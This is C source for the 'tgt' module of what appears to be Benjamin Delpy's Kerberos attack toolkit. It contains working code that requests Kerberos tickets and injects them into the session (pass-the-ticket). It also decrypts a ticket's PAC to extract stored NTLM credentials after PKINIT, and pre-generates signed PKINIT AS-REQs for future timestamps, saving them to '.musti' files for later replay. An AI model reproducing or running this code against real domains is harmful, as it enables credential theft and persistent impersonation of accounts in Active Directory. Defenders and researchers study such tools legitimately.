/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_tgt.h"

const KUHL_M_C kuhl_m_c_tgt[] = {
	{kuhl_m_tgt_ask,	L"ask", L"Ask a TGT with various authentication methods"},
	{kuhl_m_tgt_pac,	L"pac", L"pacman"},
	{kuhl_m_tgt_asreq,	L"asreq", L"PKINIT Mustiness"},
};
const KUHL_M kuhl_m_tgt = {
	L"tgt",	L"TGT module", NULL,
	ARRAYSIZE(kuhl_m_c_tgt), kuhl_m_c_tgt, NULL, NULL
};

NTSTATUS kuhl_m_tgt_ask(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS infos;
	PKULL_M_SOCK socket;
	AS_REP *AsRep = NULL;
	EncKDCRepPart *encAsRepPart = NULL;
	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;

	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
		callback = kuhl_m_kerberos_ptt_data;
	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
		{
			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &AsRep, &encAsRepPart, NULL))
			{
				kull_m_kerberos_asn1_KdcRep_save(AsRep, encAsRepPart, NULL, NULL, callback);
				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, encAsRepPart);
				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, AsRep);
			}
			kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
		}
		kull_m_kerberos_asn1_Authinfos_delete(infos);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tgt_pac(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS infos;
	PKULL_M_SOCK socket;
	AS_REP *asrep = NULL;
	EncKDCRepPart *enckdcreppart = NULL;
	EncryptionKey asKey;
	OssBuf TgsReq = {0, NULL};
	TGS_REP *TgsRep = NULL;
	_octet1 pac;

	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
		{
			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &asrep, &enckdcreppart, &asKey))
			{
				if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &asrep->cname, asrep->crealm, &asrep->cname, NULL, KERB_KDCOPTION_standard | KERB_KDCOPTION_enc_tkt_in_skey, &asrep->ticket, &enckdcreppart->key, &asrep->ticket, NULL, NULL))
				{
					if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
					{
						if(kull_m_kerberos_asn1_PAC_from_EncTicketPart(&enckdcreppart->key, &TgsRep->ticket.enc_part, &pac))
						{
							if(kull_m_string_args_byName(argc, argv, L"cred", NULL, NULL))
							{
								if(!kuhl_m_tgt_pac_cred(&pac, &asKey))
									PRINT_ERROR(L"No CREDENTIALS_INFO in the PAC\n");
							}
							else kuhl_m_kerberos_pac_info_data((PPACTYPE) pac.value, pac.length, &asKey);
							
							if(pac.value)
								LocalFree(pac.value);
						}
						else PRINT_ERROR(L"No PAC found\n");
						ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep);
					}
					ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
				}
				if(asKey.keyvalue.value)
					LocalFree(asKey.keyvalue.value);
				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, enckdcreppart);
				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, asrep);
			}
			kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
		}
		kull_m_kerberos_asn1_Authinfos_delete(infos);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tgt_asreq(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS authInfo;
	OssBuf AsReq;
	FILETIME fTime, eTime;
	KerberosTime time;
	BOOL isNonce, isSign = TRUE;
	DWORD cookie, i, increment, count;
	LPCWSTR szLifetime;

	CDGenerateRandomBits(&cookie, sizeof(cookie));
	kprintf(L"Cookie value       : %08x\n", cookie);
	if(authInfo = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		if((authInfo->type == KIWI_AUTH_INFOS_TYPE_RSA_DH) || (authInfo->type == KIWI_AUTH_INFOS_TYPE_OTF_RSA_DH))
		{
			isNonce = authInfo->u.certinfos.dhKeyInfo.dhClientNonce.value && authInfo->u.certinfos.dhKeyInfo.dhClientNonce.length;
			GetSystemTimeAsFileTime(&fTime);
			kprintf(L"> Current time     : "); kull_m_string_displayLocalFileTime(&fTime);
			if(kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, NULL))
				*(PULONGLONG) &fTime -= *(PULONGLONG) &fTime % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
			kull_m_string_args_byName(argc, argv, L"increment", &szLifetime, L"10");
			increment = wcstoul(szLifetime, NULL, 0);
			kull_m_string_args_byName(argc, argv, L"count", &szLifetime, L"1");
			count = wcstoul(szLifetime, NULL, 0);
			kprintf(L"\n> Start time       : "); kull_m_string_displayLocalFileTime(&fTime);
			kprintf(L"\n> Increment        : %u mn"
				L"\n> Count            : %u\n", increment, count);
			if(count)
			{
				*(PULONGLONG) &eTime = *(PULONGLONG) &fTime + (ULONGLONG) 10000000 * 60 * increment * (count - 1);
				kprintf(L"> End              : "); kull_m_string_displayLocalFileTime(&eTime); kprintf(L"\n\n");
				for(i = 0; (!g_isBreak && isSign) && (i < count); i++, *(PULONGLONG) &fTime += (ULONGLONG) 10000000 * 60 * increment)
				{
					kull_m_kerberos_asn1_KerberosTime_build_filetime(&time, &fTime, FALSE);
					kprintf(L"* "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L" - ");
					if(isSign = kull_m_kerberos_asn1_AsReq_build(authInfo, &time, NULL, &AsReq))
					{
						isSign = kuhl_m_tgt_asreq_export(cookie, &fTime, authInfo, &AsReq);
						ossFreeBuf(&kull_m_kerberos_asn1_world, AsReq.value);
					}
					if(isNonce)
						CDGenerateRandomBits(authInfo->u.certinfos.dhKeyInfo.dhClientNonce.value, authInfo->u.certinfos.dhKeyInfo.dhClientNonce.length);
				}
			}
			else PRINT_ERROR(L"Invalid count\n");
		}
		else PRINT_ERROR(L"Certificate and Diffie-Hellman mode needed\n");
		kull_m_kerberos_asn1_Authinfos_delete(authInfo);
	}
	return STATUS_SUCCESS;
}

BOOL kuhl_m_tgt_pac_cred(_octet1 *buf, EncryptionKey *AsRepKey)
{
	BOOL status = FALSE;
	PPACTYPE pacType = (PPACTYPE) buf->value;
	DWORD i;
	for(i = 0; i < pacType->cBuffers; i++)
	{
		if(status = pacType->Buffers[i].ulType == PACINFO_TYPE_CREDENTIALS_INFO)
		{
			kuhl_m_kerberos_pac_info_data_credentialinfo((PPAC_CREDENTIAL_INFO) ((PBYTE) pacType + pacType->Buffers[i].Offset), pacType->Buffers[i].cbBufferSize, AsRepKey);
			break;
		}
	}
	return status;
}

BOOL kuhl_m_tgt_asreq_export(DWORD cookie, PFILETIME fTime, PKIWI_AUTH_INFOS authInfo, OssBuf *asReq)
{
	BOOL status = FALSE;
	WCHAR timer[15];
	PWSTR filename;
	size_t charCount = 32 + lstrlen(authInfo->w_short_cname) + lstrlen(authInfo->w_realm); // DWORD - timer - @ .musti + 1
	if(kull_m_string_FileTimeToString(fTime, timer))
	{
		if(filename = (PWSTR) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
		{
			if(swprintf_s(filename, charCount, L"%08x-%s-%s@%s.musti", cookie, timer, authInfo->w_short_cname, authInfo->w_realm) > 0)
			{
				kprintf(L"%s -> ", filename);
				if(status = kull_m_file_writeData(filename, asReq->value, asReq->length))
					kprintf(L"OK\n");
				else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
			}
			else PRINT_ERROR(L"swprintf_s/buffer\n");
			LocalFree(filename);
		}
	}
	return status;
}